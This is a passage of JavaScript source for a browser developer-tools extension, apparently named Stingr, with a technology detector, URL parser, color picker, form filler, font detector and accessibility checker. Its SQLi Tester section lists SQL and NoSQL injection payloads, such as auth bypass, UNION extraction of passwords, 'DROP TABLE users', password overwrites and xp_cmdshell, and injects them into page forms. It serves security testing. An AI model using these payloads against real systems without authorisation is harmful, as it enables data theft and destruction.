      if (poweredBy) d.push({ name: poweredBy.content, cat: 'Server' });

      return d;
    });

    // 2) JS globals detection (MUST run in MAIN world to access page's window)
    const jsPromise = executeOnActiveTabMain(() => {
      const d = [];
      try {
        // Frameworks
        if (window.React) d.push({ name: 'React' + (window.React.version ? ' ' + window.React.version : ''), cat: 'Framework' });
        if (window.__REACT_DEVTOOLS_GLOBAL_HOOK__ && !window.React) d.push({ name: 'React', cat: 'Framework' });
        if (window.__NEXT_DATA__) d.push({ name: 'Next.js' + (window.next?.version ? ' ' + window.next.version : ''), cat: 'Framework' });
        if (window.__remixContext) d.push({ name: 'Remix', cat: 'Framework' });
        if (window.Vue) d.push({ name: 'Vue.js' + (window.Vue.version ? ' ' + window.Vue.version : ''), cat: 'Framework' });
        if (window.__VUE__ || window.__vue_app__) d.push({ name: 'Vue.js', cat: 'Framework' });
        if (window.$nuxt || window.__NUXT__) d.push({ name: 'Nuxt', cat: 'Framework' });
        if (window.angular) d.push({ name: 'AngularJS' + (window.angular.version ? ' ' + window.angular.version.full : ''), cat: 'Framework' });
        if (window.ng?.coreTokens) d.push({ name: 'Angular', cat: 'Framework' });
        if (window.__svelte) d.push({ name: 'Svelte', cat: 'Framework' });
        if (window.___gatsby || window.__GATSBY) d.push({ name: 'Gatsby', cat: 'Framework' });
        if (window.Ember) d.push({ name: 'Ember.js', cat: 'Framework' });

        // Libraries
        if (window.jQuery) d.push({ name: 'jQuery' + (window.jQuery.fn?.jquery ? ' ' + window.jQuery.fn.jquery : ''), cat: 'Library' });
        if (window._ && window._.VERSION) {
          const isLodash = typeof window._.differenceBy === 'function';
          d.push({ name: (isLodash ? 'Lodash' : 'Underscore.js') + ' ' + window._.VERSION, cat: 'Library' });
        }
        if (window.axios) d.push({ name: 'Axios', cat: 'Library' });
        if (window.moment) d.push({ name: 'Moment.js' + (window.moment.version ? ' ' + window.moment.version : ''), cat: 'Library' });
        if (window.gsap || window.TweenMax) d.push({ name: 'GSAP', cat: 'Library' });
        if (window.THREE) d.push({ name: 'Three.js', cat: 'Library' });
        if (window.d3) d.push({ name: 'D3.js' + (window.d3.version ? ' ' + window.d3.version : ''), cat: 'Library' });
        if (window.io?.Socket) d.push({ name: 'Socket.io', cat: 'Library' });
        if (window.Alpine) d.push({ name: 'Alpine.js', cat: 'Library' });
        if (window.htmx) d.push({ name: 'htmx', cat: 'Library' });

        // CMS / Platforms
        if (window.Shopify) d.push({ name: 'Shopify', cat: 'Platform' });
        if (window.Webflow) d.push({ name: 'Webflow', cat: 'Platform' });
        if (window.wixBiSession) d.push({ name: 'Wix', cat: 'Platform' });
        if (window.Squarespace) d.push({ name: 'Squarespace', cat: 'Platform' });
        if (window.wp) d.push({ name: 'WordPress', cat: 'Platform' });

        // Analytics
        if (window.gtag || window.ga || window.GoogleAnalyticsObject) d.push({ name: 'Google Analytics', cat: 'Analytics' });
        if (window.google_tag_manager || window.dataLayer) d.push({ name: 'Google Tag Manager', cat: 'Analytics' });
        if (window.fbq) d.push({ name: 'Meta Pixel', cat: 'Analytics' });
        if (window.hj || window._hjSettings) d.push({ name: 'Hotjar', cat: 'Analytics' });
        if (window.mixpanel) d.push({ name: 'Mixpanel', cat: 'Analytics' });
        if (window.amplitude) d.push({ name: 'Amplitude', cat: 'Analytics' });
        if (window.analytics?.SNIPPET_VERSION) d.push({ name: 'Segment', cat: 'Analytics' });
        if (window.Intercom) d.push({ name: 'Intercom', cat: 'Tools' });
        if (window.__SENTRY__) d.push({ name: 'Sentry', cat: 'Analytics' });

        // Build tools
        if (window.webpackChunk || window.webpackJsonp) d.push({ name: 'Webpack', cat: 'Build' });
        if (window.__vite_is_modern_browser) d.push({ name: 'Vite', cat: 'Build' });
        if (window.firebase) d.push({ name: 'Firebase' + (window.firebase.SDK_VERSION ? ' ' + window.firebase.SDK_VERSION : ''), cat: 'Platform' });
        if (window.__APOLLO_CLIENT__ || window.__APOLLO_STATE__) d.push({ name: 'Apollo GraphQL', cat: 'Library' });
      } catch (e) {}
      return d;
    });

    // 3) Response headers detection
    const headerPromise = getCurrentTab().then(tab => {
      if (!tab?.url || tab.url.startsWith('chrome://')) return [];
      return fetch(tab.url, { method: 'HEAD', mode: 'no-cors' }).then(r => {
        const d = [];
        const server = r.headers.get('server') || '';
        const via = r.headers.get('via') || '';
        const powered = r.headers.get('x-powered-by') || '';
        if (server.toLowerCase().includes('cloudflare') || r.headers.get('cf-ray')) d.push({ name: 'Cloudflare', cat: 'CDN' });
        if (server.toLowerCase().includes('vercel') || r.headers.get('x-vercel-id')) d.push({ name: 'Vercel', cat: 'CDN' });
        if (server.toLowerCase().includes('netlify') || r.headers.get('x-nf-request-id')) d.push({ name: 'Netlify', cat: 'CDN' });
        if (r.headers.get('x-amz-request-id') || r.headers.get('x-amz-id-2')) d.push({ name: 'AWS', cat: 'CDN' });
        if (server.toLowerCase().includes('nginx')) d.push({ name: 'Nginx', cat: 'Server' });
        if (server.toLowerCase().includes('apache')) d.push({ name: 'Apache', cat: 'Server' });
        if (powered.toLowerCase().includes('next.js')) d.push({ name: 'Next.js', cat: 'Framework' });
        if (powered.toLowerCase().includes('express')) d.push({ name: 'Express', cat: 'Server' });
        if (powered.toLowerCase().includes('php')) d.push({ name: 'PHP', cat: 'Server' });
        if (powered.toLowerCase().includes('asp.net')) d.push({ name: 'ASP.NET', cat: 'Server' });
        if (r.headers.get('x-drupal-cache')) d.push({ name: 'Drupal', cat: 'Platform' });
        if (r.headers.get('x-shopid')) d.push({ name: 'Shopify', cat: 'Platform' });
        if (r.headers.get('x-wix-request-id')) d.push({ name: 'Wix', cat: 'Platform' });
        return d;
      }).catch(() => []);
    });

    // Combine all results, deduplicate
    Promise.all([domPromise, jsPromise, headerPromise]).then(([domResults, jsResults, headerResults]) => {
      const all = [...(domResults || []), ...(jsResults || []), ...(headerResults || [])];

      // Deduplicate by base name (take the one with version if available)
      const map = {};
      all.forEach(t => {
        const baseName = t.name.split(' ')[0];
        const key = baseName.toLowerCase() + ':' + t.cat;
        if (!map[key] || t.name.length > map[key].name.length) {
          map[key] = t;
        }
      });
      const techs = Object.values(map);

      if (techs.length === 0) {
        output.innerHTML = '<div class="tool-empty">No technologies detected</div>';
        return;
      }

      // Group by category
      const catOrder = ['Framework', 'Library', 'CSS', 'Platform', 'Analytics', 'Tools', 'CDN', 'Build', 'Server'];
      const groups = {};
      techs.forEach(t => {
        if (!groups[t.cat]) groups[t.cat] = [];
        groups[t.cat].push(t.name);
      });

      let html = '';
      catOrder.forEach(cat => {
        if (!groups[cat]) return;
        html += `<div class="info-section">
          <div class="info-section-title">${escapeHtml(cat)}</div>
          <div class="badge-list">
            ${groups[cat].map(n => `<span class="badge badge-tech">${escapeHtml(n)}</span>`).join('')}
          </div>
        </div>`;
      });

      html += `<div class="hint" style="margin-top:6px">${techs.length} technolog${techs.length > 1 ? 'ies' : 'y'} detected</div>`;
      output.innerHTML = html;
    }).catch(e => showError(output, e.message));
  }

  scan();
  el.querySelector('#tech-refresh').addEventListener('click', scan);
}

// ═══════════════════════════════════════════════════════════════════════════
// TOOL: URL Parser (kept from original)
// ═══════════════════════════════════════════════════════════════════════════

function renderUrlParseTool(el) {
  el.innerHTML = `
    <textarea id="urlp-input" placeholder="Paste a URL here..." style="min-height: 56px"></textarea>
    <div class="btn-row">
      <button class="btn btn-primary" id="urlp-parse">Parse</button>
      <button class="btn" id="urlp-current">Current Tab</button>
      <button class="btn btn-clear" id="urlp-clear">Clear</button>
    </div>
    <div id="urlp-output" class="hidden"></div>
  `;

  const input = el.querySelector('#urlp-input');
  const output = el.querySelector('#urlp-output');

  function doParse() {
    const raw = input.value.trim();
    if (!raw) return;

    let url;
    try { url = new URL(raw); } catch {
      output.innerHTML = '<div style="color: var(--error); font-size: 12px; padding: 4px 0">Invalid URL</div>';
      output.classList.remove('hidden');
      return;
    }

    let html = '<div class="urlp-results">';
    const parts = [
      ['Protocol', url.protocol.replace(/:$/, '')],
      ['Host', url.hostname],
      ['Port', url.port || '(default)'],
      ['Path', url.pathname],
      ['Hash', url.hash ? url.hash.slice(1) : ''],
    ];

    parts.forEach(([label, value]) => {
      if (!value) return;
      html += `<div class="urlp-row">
        <span class="urlp-label">${label}</span>
        <span class="urlp-value" data-copy="${escapeHtml(value)}">${escapeHtml(value)}</span>
      </div>`;
    });

    const params = Array.from(url.searchParams.entries());
    if (params.length > 0) {
      html += '<div class="urlp-section-title">Query Parameters</div>';
      params.forEach(([key, val]) => {
        let decoded = val;
        try { decoded = decodeURIComponent(val); } catch {}
        html += `<div class="urlp-row urlp-param">
          <span class="urlp-key" data-copy="${escapeHtml(key)}">${escapeHtml(key)}</span>
          <span class="urlp-eq">=</span>
          <span class="urlp-value" data-copy="${escapeHtml(decoded)}">${escapeHtml(decoded)}</span>
        </div>`;
      });
      html += `<div class="urlp-row" style="margin-top: 6px">
        <span class="urlp-label">Full query</span>
        <span class="urlp-value urlp-full-query" data-copy="${escapeHtml(url.search.slice(1))}">${escapeHtml(url.search.slice(1))}</span>
      </div>`;
    }

    html += '</div>';
    output.innerHTML = html;
    output.classList.remove('hidden');
    bindCopyAll(output);
  }

  el.querySelector('#urlp-parse').addEventListener('click', doParse);
  el.querySelector('#urlp-clear').addEventListener('click', () => {
    input.value = '';
    output.innerHTML = '';
    output.classList.add('hidden');
  });

  function loadCurrentTab() {
    if (typeof chrome !== 'undefined' && chrome.tabs) {
      chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
        if (tabs[0] && tabs[0].url) {
          input.value = tabs[0].url;
          doParse();
        }
      });
    } else {
      input.value = window.location.href;
      doParse();
    }
  }

  el.querySelector('#urlp-current').addEventListener('click', loadCurrentTab);
  loadCurrentTab();

  input.addEventListener('keydown', e => {
    if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); doParse(); }
  });
}

// ═══════════════════════════════════════════════════════════════════════════
// TOOL: Color Picker (kept from original)
// ═══════════════════════════════════════════════════════════════════════════

function renderColorTool(el) {
  const hasEyeDropper = typeof window.EyeDropper !== 'undefined';

  el.innerHTML = `
    ${hasEyeDropper ? '<button class="btn btn-picker" id="color-pick">Pick from screen</button>' : ''}
    <div class="color-preview" id="color-preview"></div>
    <div class="color-grid" id="color-output"></div>
    <div style="margin-top: 6px">
      <label style="text-transform: none; font-size: 12px">Enter HEX</label>
      <div class="inline-row" style="margin-top: 4px">
        <input type="text" id="color-hex" placeholder="#60a5fa" style="flex: 1">
        <button class="btn btn-primary" id="color-convert">Convert</button>
      </div>
    </div>
  `;

  const preview = el.querySelector('#color-preview');
  const output = el.querySelector('#color-output');
  const hexInput = el.querySelector('#color-hex');

  function showColor(r, g, b) {
    const hex = rgbToHex(r, g, b);
    const hsl = rgbToHsl(r, g, b);
    preview.style.background = hex;

    output.innerHTML = `
      <span class="label">HEX</span><span class="value" data-copy="${escapeHtml(hex)}">${escapeHtml(hex)}</span>
      <span class="label">RGB</span><span class="value" data-copy="${escapeHtml(formatRgb({ r, g, b }))}">${escapeHtml(formatRgb({ r, g, b }))}</span>
      <span class="label">HSL</span><span class="value" data-copy="${escapeHtml(formatHsl(hsl))}">${escapeHtml(formatHsl(hsl))}</span>
    `;
    hexInput.value = hex;
    bindCopyAll(output);
  }

  if (hasEyeDropper) {
    el.querySelector('#color-pick').addEventListener('click', async () => {
      try {
        const dropper = new EyeDropper();
        const result = await dropper.open();
        const rgb = hexToRgb(result.sRGBHex);
        if (rgb) showColor(rgb.r, rgb.g, rgb.b);
      } catch {}
    });
  }

  el.querySelector('#color-convert').addEventListener('click', () => {
    const rgb = hexToRgb(hexInput.value.trim());
    if (!rgb) {
      output.innerHTML = '<span class="label">Error</span><span class="value" style="color: var(--error)">Invalid hex color</span>';
      return;
    }
    showColor(rgb.r, rgb.g, rgb.b);
  });

  hexInput.addEventListener('keydown', e => {
    if (e.key === 'Enter') { e.preventDefault(); el.querySelector('#color-convert').click(); }
  });

  const defaultRgb = hexToRgb('#60a5fa');
  if (defaultRgb) showColor(defaultRgb.r, defaultRgb.g, defaultRgb.b);
}

// ═══════════════════════════════════════════════════════════════════════════
// TOOL: Form Auto-Filler
// ═══════════════════════════════════════════════════════════════════════════

function renderFormsTool(el) {
  el.innerHTML = `
    <div class="btn-row">
      <button class="btn btn-primary" id="forms-fill">Fill All Forms</button>
      <button class="btn" id="forms-clear">Clear All</button>
    </div>
    <div class="form-options">
      <label class="form-opt"><input type="checkbox" id="forms-realistic" checked> Realistic data</label>
      <label class="form-opt"><input type="checkbox" id="forms-submit" > Auto-submit <span class="badge badge-warn">!</span></label>
    </div>
    <div id="forms-output" class="hidden"></div>
    <div class="hint" style="margin-top: 6px">Fills text inputs, selects, checkboxes, and textareas</div>
  `;

  el.querySelector('#forms-fill').addEventListener('click', () => {
    const realistic = el.querySelector('#forms-realistic').checked;
    const autoSubmit = el.querySelector('#forms-submit').checked;
    const output = el.querySelector('#forms-output');

    executeOnActiveTab((realistic, autoSubmit) => {
      const firstNames = ['James', 'Emma', 'Liam', 'Olivia', 'Noah', 'Ava', 'Sophia', 'Mason', 'Isabella', 'William'];
      const lastNames = ['Smith', 'Johnson', 'Brown', 'Taylor', 'Anderson', 'Thomas', 'Jackson', 'White', 'Harris', 'Martin'];
      const domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'example.com', 'test.com'];
      const streets = ['123 Main St', '456 Oak Ave', '789 Pine Rd', '321 Elm Blvd', '654 Maple Dr'];
      const cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix'];
      const states = ['NY', 'CA', 'IL', 'TX', 'AZ'];

      const rand = arr => arr[Math.floor(Math.random() * arr.length)];
      const randNum = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;

      const firstName = rand(firstNames);
      const lastName = rand(lastNames);
      const email = realistic
        ? `${firstName.toLowerCase()}.${lastName.toLowerCase()}${randNum(1, 99)}@${rand(domains)}`
        : `test${randNum(1, 999)}@test.com`;
      const phone = `(${randNum(200, 999)}) ${randNum(200, 999)}-${randNum(1000, 9999)}`;

      const data = {
        name: `${firstName} ${lastName}`,
        first_name: firstName, firstname: firstName, first: firstName, fname: firstName,
        last_name: lastName, lastname: lastName, last: lastName, lname: lastName,
        email: email, mail: email,
        phone: phone, tel: phone, telephone: phone, mobile: phone,
        address: rand(streets), street: rand(streets),
        city: rand(cities),
        state: rand(states), province: rand(states),
        zip: String(randNum(10000, 99999)), zipcode: String(randNum(10000, 99999)), postal: String(randNum(10000, 99999)),
        country: 'United States',
        company: `${rand(lastNames)} ${rand(['Inc', 'LLC', 'Corp', 'Co'])}`,
        url: 'https://example.com', website: 'https://example.com',
        username: `${firstName.toLowerCase()}${randNum(1, 999)}`,
        password: `Test${randNum(1000, 9999)}!`,
        message: 'This is a test message generated by Stingr.',
        comment: 'Test comment from Stingr developer tools.',
        subject: 'Test Subject',
        age: String(randNum(18, 65)),
      };

      let filled = 0;
      const inputs = document.querySelectorAll('input, textarea, select');
      inputs.forEach(inp => {
        if (inp.type === 'hidden' || inp.type === 'submit' || inp.type === 'button' || inp.disabled || inp.readOnly) return;

        const name = (inp.name || inp.id || inp.placeholder || '').toLowerCase().replace(/[-_\s]/g, '');

        if (inp.type === 'checkbox') {
          inp.checked = true;
          filled++;
        } else if (inp.type === 'radio') {
          if (!document.querySelector(`input[name="${inp.name}"]:checked`)) {
            inp.checked = true;
            filled++;
          }
        } else if (inp.tagName === 'SELECT') {
          const options = inp.querySelectorAll('option');
          if (options.length > 1) {
            inp.selectedIndex = randNum(1, options.length - 1);
            filled++;
          }
        } else {
          let value = '';
          for (const [key, val] of Object.entries(data)) {
            if (name.includes(key)) { value = val; break; }
          }
          if (!value) {
            if (inp.type === 'email') value = email;
            else if (inp.type === 'tel') value = phone;
            else if (inp.type === 'url') value = 'https://example.com';
            else if (inp.type === 'number') value = String(randNum(1, 100));
            else if (inp.type === 'date') value = '1990-06-15';
            else if (inp.tagName === 'TEXTAREA') value = data.message;
            else value = realistic ? `${firstName} ${lastName}` : 'Test';
          }
          const nativeInputValueSetter = Object.getOwnPropertyDescriptor(
            inp.tagName === 'TEXTAREA' ? window.HTMLTextAreaElement.prototype : window.HTMLInputElement.prototype, 'value'
          ).set;
          nativeInputValueSetter.call(inp, value);
          inp.dispatchEvent(new Event('input', { bubbles: true }));
          inp.dispatchEvent(new Event('change', { bubbles: true }));
          filled++;
        }
      });

      if (autoSubmit) {
        const form = document.querySelector('form');
        if (form) form.submit();
      }

      return filled;
    }, [realistic, autoSubmit]).then(count => {
      const output = el.querySelector('#forms-output');
      output.innerHTML = `<div class="tool-success">Filled ${count} field${count !== 1 ? 's' : ''}</div>`;
      output.classList.remove('hidden');
    }).catch(e => {
      const output = el.querySelector('#forms-output');
      showError(output, e.message);
      output.classList.remove('hidden');
    });
  });

  el.querySelector('#forms-clear').addEventListener('click', () => {
    executeOnActiveTab(() => {
      let cleared = 0;
      document.querySelectorAll('input, textarea, select').forEach(inp => {
        if (inp.type === 'hidden' || inp.type === 'submit' || inp.type === 'button') return;
        if (inp.type === 'checkbox' || inp.type === 'radio') { inp.checked = false; }
        else if (inp.tagName === 'SELECT') { inp.selectedIndex = 0; }
        else {
          const setter = Object.getOwnPropertyDescriptor(
            inp.tagName === 'TEXTAREA' ? window.HTMLTextAreaElement.prototype : window.HTMLInputElement.prototype, 'value'
          ).set;
          setter.call(inp, '');
          inp.dispatchEvent(new Event('input', { bubbles: true }));
          inp.dispatchEvent(new Event('change', { bubbles: true }));
        }
        cleared++;
      });
      return cleared;
    }).then(count => {
      const output = el.querySelector('#forms-output');
      output.innerHTML = `<div class="tool-success">Cleared ${count} field${count !== 1 ? 's' : ''}</div>`;
      output.classList.remove('hidden');
    }).catch(e => {
      const output = el.querySelector('#forms-output');
      showError(output, e.message);
      output.classList.remove('hidden');
    });
  });
}

// ═══════════════════════════════════════════════════════════════════════════
// TOOL: SQLi Tester
// ═══════════════════════════════════════════════════════════════════════════

const SQLI_PAYLOADS = {
  'Auth Bypass': [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "' OR 1=1 --",
    "' OR 'x'='x",
    "') OR ('1'='1",
    "' OR ''='",
    "1' OR '1'='1' --",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR '1'='1' --",
    "' OR 'a'='a",
    "') OR ('a'='a",
  ],
  'Union Based': [
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT NULL, NULL, NULL --",
    "' UNION SELECT 1,2,3 --",
    "' UNION SELECT username, password FROM users --",
    "' UNION ALL SELECT NULL, NULL, NULL --",
    "1 UNION SELECT ALL FROM information_schema AND ' or SLEEP(5) or '",
    "' UNION SELECT @@version --",
    "' UNION SELECT table_name, NULL FROM information_schema.tables --",
  ],
  'Error Based': [
    "' AND 1=CONVERT(int, @@version) --",
    "' AND 1=1 --",
    "' AND 1=2 --",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, version())) --",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
    "' AND UPDATEXML(1, CONCAT(0x7e, version()), 1) --",
    "1' AND 1=1 --",
    "1' AND 1=2 --",
  ],
  'Time Based': [
    "' OR SLEEP(5) --",
    "' OR BENCHMARK(10000000, SHA1('test')) --",
    "'; WAITFOR DELAY '0:0:5' --",
    "1' AND SLEEP(5) --",
    "' OR pg_sleep(5) --",
    "1; WAITFOR DELAY '0:0:5' --",
    "' AND (SELECT * FROM (SELECT SLEEP(5))a) --",
  ],
  'Stacked Queries': [
    "'; DROP TABLE users --",
    "'; SELECT * FROM users --",
    "1; DROP TABLE users --",
    "'; INSERT INTO users VALUES('hacked','hacked') --",
    "'; UPDATE users SET password='hacked' WHERE username='admin' --",
    "'; EXEC xp_cmdshell('dir') --",
  ],
  'Encoding / Evasion': [
    "%27%20OR%20%271%27%3D%271",
    "&#39; OR &#39;1&#39;=&#39;1",
    "' oR '1'='1",
    "' /*!OR*/ '1'='1",
    "'+OR+'1'='1",
    "' OR 0x31=0x31 --",
    "' OR CHAR(49)=CHAR(49) --",
    "%2527%2520OR%25201%253D1",
    "' \\x4F\\x52 '1'='1",
  ],
  'NoSQL Injection': [
    "{'$gt': ''}",
    "{'$ne': ''}",
    "{'$regex': '.*'}",
    "admin' || '1'=='1",
    "{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}",
    "'; return true; var x='",
    "true, $where: '1 == 1'",
    "{\"$where\": \"1 == 1\"}",
  ],
  'XSS via SQLi': [
    "' <script>alert(1)</script> --",
    "' UNION SELECT '<script>alert(1)</script>' --",
    "1' AND 1=1 UNION SELECT '<img src=x onerror=alert(1)>' --",
  ],
};

function renderSqliTool(el) {
  const categories = Object.keys(SQLI_PAYLOADS);

  el.innerHTML = `
    <div class="sqli-controls">
      <select id="sqli-cat" style="flex: 1">
        ${categories.map(c => `<option value="${c}">${c} (${SQLI_PAYLOADS[c].length})</option>`).join('')}
      </select>
      <button class="btn btn-primary" id="sqli-inject">Inject All Fields</button>
    </div>
    <div id="sqli-list"></div>
    <div id="sqli-output" class="hidden"></div>
    <div class="hint" style="margin-top: 6px">Click a payload to copy. "Inject" fills all visible form fields on the page.</div>
  `;

  const catSelect = el.querySelector('#sqli-cat');
  const listEl = el.querySelector('#sqli-list');

  function renderPayloads() {
    const cat = catSelect.value;
    const payloads = SQLI_PAYLOADS[cat];
    listEl.innerHTML = '<div class="sqli-payloads">' + payloads.map((p, i) =>
      `<div class="sqli-row">
        <span class="sqli-index">${i + 1}</span>
        <code class="sqli-payload" data-copy="${escapeHtml(p)}">${escapeHtml(p)}</code>
        <button class="btn-tiny sqli-use" data-idx="${i}" title="Inject this one">&#9654;</button>
      </div>`
    ).join('') + '</div>';
    bindCopyAll(listEl);

    // Individual inject buttons
    listEl.querySelectorAll('.sqli-use').forEach(btn => {
      btn.addEventListener('click', () => {
        const payload = payloads[parseInt(btn.dataset.idx)];
        injectPayload(payload);
      });
    });
  }

  function injectPayload(payload) {
    executeOnActiveTab((payload) => {
      let filled = 0;
      document.querySelectorAll('input, textarea').forEach(inp => {
        if (inp.type === 'hidden' || inp.type === 'submit' || inp.type === 'button' ||
            inp.type === 'checkbox' || inp.type === 'radio' || inp.type === 'file' ||
            inp.disabled || inp.readOnly) return;
        const setter = Object.getOwnPropertyDescriptor(
          inp.tagName === 'TEXTAREA' ? window.HTMLTextAreaElement.prototype : window.HTMLInputElement.prototype, 'value'
        ).set;
        setter.call(inp, payload);
        inp.dispatchEvent(new Event('input', { bubbles: true }));
        inp.dispatchEvent(new Event('change', { bubbles: true }));
        filled++;
      });
      return filled;
    }, [payload]).then(count => {
      const output = el.querySelector('#sqli-output');
      output.innerHTML = `<div class="tool-success">Injected into ${count} field${count !== 1 ? 's' : ''}</div>`;
      output.classList.remove('hidden');
      setTimeout(() => output.classList.add('hidden'), 2000);
    }).catch(e => {
      const output = el.querySelector('#sqli-output');
      showError(output, e.message);
      output.classList.remove('hidden');
    });
  }

  // Inject all — cycles through payloads in the selected category
  el.querySelector('#sqli-inject').addEventListener('click', () => {
    const cat = catSelect.value;
    const payloads = SQLI_PAYLOADS[cat];
    // Use a random payload from the category
    const payload = payloads[Math.floor(Math.random() * payloads.length)];
    injectPayload(payload);
  });

  catSelect.addEventListener('change', renderPayloads);
  renderPayloads();
}

// ═══════════════════════════════════════════════════════════════════════════
// TOOL: Font Detector
// ═══════════════════════════════════════════════════════════════════════════

function renderFontsTool(el) {
  el.innerHTML = `<div id="fonts-output"></div>`;
  const output = el.querySelector('#fonts-output');
  showLoading(output);

  executeOnActiveTab(() => {
    const fontMap = {};
    const elements = document.querySelectorAll('body *');
    elements.forEach(el => {
      const style = getComputedStyle(el);
      const family = style.fontFamily;
      if (!family) return;

      // Parse font families
      family.split(',').forEach(f => {
        f = f.trim().replace(/['"]/g, '');
        if (!f) return;
        if (!fontMap[f]) fontMap[f] = { count: 0, weights: new Set(), sizes: new Set() };
        fontMap[f].count++;
        fontMap[f].weights.add(style.fontWeight);
        fontMap[f].sizes.add(style.fontSize);
      });
    });

    // Convert Sets to arrays
    return Object.entries(fontMap)
      .map(([name, data]) => ({
        name,
        count: data.count,
        weights: [...data.weights].sort(),
        sizes: [...data.sizes].sort((a, b) => parseFloat(a) - parseFloat(b)),
      }))
      .sort((a, b) => b.count - a.count);
  }).then(fonts => {
    if (!fonts || fonts.length === 0) {
      output.innerHTML = '<div class="tool-empty">No fonts detected</div>';
      return;
    }

    let html = '';
    fonts.forEach(f => {
      html += `<div class="font-card">
        <div class="font-name" data-copy="${escapeHtml(f.name)}">${escapeHtml(f.name)}</div>
        <div class="font-preview" style="font-family: '${escapeHtml(f.name)}', sans-serif">
          The quick brown fox jumps over the lazy dog
        </div>
        <div class="font-meta">
          <span>Used by ${f.count} elements</span>
          <span>Weights: ${f.weights.join(', ')}</span>
        </div>
        <div class="font-meta"><span>Sizes: ${f.sizes.slice(0, 6).join(', ')}${f.sizes.length > 6 ? '...' : ''}</span></div>
      </div>`;
    });
    html += `<div class="hint" style="margin-top: 6px">${fonts.length} font famil${fonts.length > 1 ? 'ies' : 'y'} · Click name to copy</div>`;
    output.innerHTML = html;
    bindCopyAll(output);
  }).catch(e => showError(output, e.message));
}

// ═══════════════════════════════════════════════════════════════════════════
// TOOL: Accessibility Checker
// ═══════════════════════════════════════════════════════════════════════════

function renderA11yTool(el) {
  el.innerHTML = `
    <button class="btn btn-primary" id="a11y-run" style="width: 100%">Run Audit</button>
    <div id="a11y-output"></div>
  `;

  el.querySelector('#a11y-run').addEventListener('click', () => {
    const output = el.querySelector('#a11y-output');
    showLoading(output);

    executeOnActiveTab(() => {
      const issues = [];
      const warnings = [];
      const passes = [];

      // Images without alt
      const imgs = document.querySelectorAll('img');
      const noAlt = Array.from(imgs).filter(i => !i.hasAttribute('alt'));
      if (noAlt.length) issues.push({ type: 'error', msg: `${noAlt.length} image${noAlt.length > 1 ? 's' : ''} missing alt attribute` });
      else if (imgs.length) passes.push(`All ${imgs.length} images have alt text`);

      // Buttons/links without text
      const emptyBtns = Array.from(document.querySelectorAll('button')).filter(b =>
        !b.textContent.trim() && !b.getAttribute('aria-label') && !b.getAttribute('title')
      );
      if (emptyBtns.length) issues.push({ type: 'error', msg: `${emptyBtns.length} button${emptyBtns.length > 1 ? 's' : ''} without accessible text` });

      const emptyLinks = Array.from(document.querySelectorAll('a')).filter(a =>
        !a.textContent.trim() && !a.getAttribute('aria-label') && !a.getAttribute('title') && !a.querySelector('img')
      );
      if (emptyLinks.length) issues.push({ type: 'error', msg: `${emptyLinks.length} link${emptyLinks.length > 1 ? 's' : ''} without accessible text` });

      // Form inputs without labels
      const inputs = document.querySelectorAll('input:not([type="hidden"]):not([type="submit"]):not([type="button"]), textarea, select');
      const noLabel = Array.from(inputs).filter(inp => {
        const id = inp.id;
        const hasLabel = id && document.querySelector(`label[for="${id}"]`);
        const hasAriaLabel = inp.getAttribute('aria-label') || inp.getAttribute('aria-labelledby');
        const wrappedInLabel = inp.closest('label');
        return !hasLabel && !hasAriaLabel && !wrappedInLabel;
      });
      if (noLabel.length) issues.push({ type: 'error', msg: `${noLabel.length} form input${noLabel.length > 1 ? 's' : ''} without labels` });

      // Heading hierarchy
      const headings = Array.from(document.querySelectorAll('h1, h2, h3, h4, h5, h6'));
      const levels = headings.map(h => parseInt(h.tagName[1]));
      let headingIssue = false;
      for (let i = 1; i < levels.length; i++) {
        if (levels[i] > levels[i - 1] + 1) {
          headingIssue = true;
          break;
        }
      }
      const h1Count = document.querySelectorAll('h1').length;
      if (h1Count === 0) warnings.push('No h1 heading found');
      else if (h1Count > 1) warnings.push(`${h1Count} h1 headings found (should typically be 1)`);
      if (headingIssue) warnings.push('Heading levels are skipped (e.g., h1 → h3)');
      if (!headingIssue && headings.length) passes.push('Heading hierarchy is correct');

      // Lang attribute
      if (!document.documentElement.lang) {
        warnings.push('Missing lang attribute on <html>');
      } else {
        passes.push(`Language set to "${document.documentElement.lang}"`);
      }

      // Viewport meta
      const viewport = document.querySelector('meta[name="viewport"]');
      if (!viewport) warnings.push('Missing viewport meta tag');
      else if (viewport.content && viewport.content.includes('user-scalable=no')) {
        warnings.push('Viewport disables user scaling');
      }

      // Skip link
      const firstLink = document.querySelector('a');
      if (firstLink && (firstLink.href.includes('#main') || firstLink.href.includes('#content') || firstLink.textContent.toLowerCase().includes('skip'))) {
        passes.push('Skip navigation link found');
      }

      // Focus styles
      const focusable = document.querySelector('a, button, input, textarea, select');
      if (focusable) {
        const style = getComputedStyle(focusable, ':focus');
        // Can't reliably check :focus styles from script, just note it
      }

      // ARIA landmarks
      const landmarks = document.querySelectorAll('main, [role="main"], nav, [role="navigation"], [role="banner"], header, footer');
      if (landmarks.length) passes.push(`${landmarks.length} ARIA landmarks found`);
      else warnings.push('No ARIA landmarks detected');

      return { issues, warnings, passes, stats: { elements: document.querySelectorAll('*').length, images: imgs.length, forms: inputs.length, headings: headings.length } };
    }).then(data => {
      if (!data) { showError(output, 'Could not run audit'); return; }

      let html = '';

      // Score summary
      const total = data.issues.length + data.warnings.length;
      const scoreColor = total === 0 ? 'var(--success)' : total <= 3 ? '#fbbf24' : 'var(--error)';
      html += `<div class="a11y-score" style="border-color: ${scoreColor}">
        <span style="color: ${scoreColor}; font-size: 18px; font-weight: 700">${data.issues.length + data.warnings.length}</span>
        <span style="color: var(--text-secondary); font-size: 11px">issues found</span>
      </div>`;

      // Issues
      if (data.issues.length) {
        html += '<div class="info-section"><div class="info-section-title" style="color: var(--error)">Errors</div>';
